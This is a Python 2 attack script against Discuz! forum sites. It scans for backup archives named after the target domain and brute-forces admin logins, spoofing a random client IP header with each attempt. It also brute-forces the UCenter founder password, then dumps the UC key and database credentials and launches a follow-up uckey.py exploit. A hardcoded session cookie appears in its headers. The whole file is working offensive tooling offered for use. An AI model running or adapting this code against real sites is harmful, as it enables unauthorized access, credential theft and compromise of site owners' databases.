# coding:utf-8
# __author__ = 'croxy'
from sys import argv
import random,argparse,requests,urlparse,sys,optparse,os
from multiprocessing.dummy import Pool as ThreadPool

header = {
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
"Cookie":'SLnewses=1; WPTLNG=1; LoginState=4yZkh4RciCCEChSqplC%2FluVnH9lGBA78s9aGBLhUBdOtx9w56Iv0%2Fh8Ur%2F8Pd2BG6wW%2BTNMy%2Fud9%0AUz2azvnFid3FaowdeMI%2FmIb7n4Kk0mNHZ8AIFnZByJJTG1bp%2FS3D%2Blu15tqqmDpu%2BeYrF3MlVkKe%0Aux9hk8xtttRqoWMfc6D1xnRfGhVDTxx4vC0cac%2F9APB2Wo9GJrPgpyU1FruHbeqGSHnP%2F0RFc1wu%0AOyKDNdRD3oD8j5J8QBBem0MgZ4H9kWFJmtHYYNAPeXDlSa9UUg%3D%3D%0A'
}

def ScanDir(host):
    q = requests.get(host, headers=header, allow_redirects = False)
    code = q.status_code
    if code == 200 or code == 301:
        print "%s ====> Found!!!" % host
    elif code == 403:
        print "%s ====> 403 Found !!!!" % host
    return

    
def DirScan(host, path):
    host2 = host+path
    hostuser = host.split('.')
    hostuser = hostuser[len(hostuser)-2]
    scan =  [hostuser+'.rar',hostuser+'.zip',hostuser+hostuser+'.rar',hostuser+'.rar',hostuser+'.tar.gz',hostuser+'.tar',hostuser+'123.zip',hostuser+'123.tar.gz',hostuser+hostuser+'.zip',hostuser+hostuser+'.tar.gz',hostuser+hostuser+'.tar',hostuser+'.bak']
    f = open('mulu.txt','r')
    lujing = f.read().split()
    Wordlist = scan+lujing
    pool = ThreadPool(10)
    result = []
    for x in range(len(Wordlist)):
        Dict = Wordlist[x]
        #host1 = urlparse.urljoin(host2,Dict)
        host1 = host2+Dict
        #print host1
        result.append(host1)
    pool.map(ScanDir, result)
    pool.close()
    pool.join()
    print "All Dict Run Over"

def LoginDisCuz(opts):
    host = opts['host']
    user = opts['user']
    password = opts['password']
    #print "try %s : %s" % (user, password)
    ip = str(random.randint(1,100))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))
    headers ={
         "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
         "client-ip": ip
    }
    url = host+"/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1&handlekey=ls&quickforward=yes&username=%s&password=%s"  %(user, password)
    r = requests.get(url, headers=headers)
    body = r.text
    result = body.find('window.location.href')
    if result != -1 :
        print "the %s Admin : %s  Password: %s " %(host, user, password)
        sys.exit()


def BurstDz(host, path, user, passfile):
    hostuser = host.split('.')
    hostuser = hostuser[len(hostuser)-2]
    hostdir = [hostuser,hostuser+hostuser,'admin'+hostuser,hostuser+'123','manage'+hostuser,hostuser+'123456',hostuser+'admin','123'+hostuser]

    opts_list = []

    f = open(passfile, 'r')
    password = f.read().split()
    dic = password+hostdir
    pool = ThreadPool(10)
    host1 = host+path

    for x in range(len(dic)):
        mima = dic[x]
        opts = {
            'host': host1,
            'user': user,
            'password': mima
        }
        opts_list.append(opts)

    #print hostr
    #print result
    pool.map(LoginDisCuz, opts_list)
    #pool.join()
    print 'All PassWord Run Over'

def LoginUc(opts):
    host = opts['host']
    password = opts['password']
    #print "Try %s" % password
    url = host+"/uc_server/index.php?m=app&a=ucinfo&release=20110500"
    payload = {'m': 'app','a':'add','ucfounder' : '','ucfounderpw' : password, 'apptype': 'DISCUZX', 'appname':'Discuz!', 'appurl':'localhost', 'appip' : '', 'appcharset' :'gbk','appdbcharset':'gbk', 'release':'20110501'}
    #print url
    #print payload
    q = requests.post(url, data=payload, headers = header)
    text = q.text
    if text != '-1':
        result = text.split('|')
        print """ The UCKEY %s
                  The Database UserName is %s@%s
                  The Database PassWord is %s
                  The Database Name is %s """ % (result[0], result[4], result[2],result[5],result[3])
        cmd = "python uckey.py %s %s" % (host, result[0])
        os.system(cmd)
        print cmd
        sys.exit()

def BurstUc(host, path, passfile):
    hostuser = host.split('.')
    hostuser = hostuser[len(hostuser)-2]
    hostdir = [hostuser,hostuser+hostuser,'admin'+hostuser,hostuser+'123','manage'+hostuser,hostuser+'123456',hostuser+'admin','123'+hostuser]

    opts_list = []

    f = open(passfile, 'r')
    password = f.read().split()
    dic = password+hostdir
    pool = ThreadPool(10)
    host1 = host+path

    for x in range(len(dic)):
        mima = dic[x]

        opts = {
            'host': host1,
            'password': mima
        }
        opts_list.append(opts)

    pool.map(LoginUc,opts_list)
    pool.join()
    print "All PassWord Run Over"

if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog [options]')
    parser.add_option('-t', '--host', dest='host',type='string', help='The Traget')
    parser.add_option('-p', '--path', dest='path', type='string', help='The DisCuz Web Path')
    parser.add_option('-u', '--username', dest='user', type='string', help='The Disucz Admin Username')
    parser.add_option('-f', '--passfile', dest='passfile', type='string', default='password.txt',help='The PassWord passfile' )
    (options, args) = parser.parse_args()
    #print len(args)
    host = options.host
    path = options.path
    user = options.user
    passfile = options.passfile
    if user:
        BurstDz(host, path, user, passfile)
        BurstUc(host, path, passfile)
    elif host:
        DirScan(host, path)
    else:
        parser.print_help()







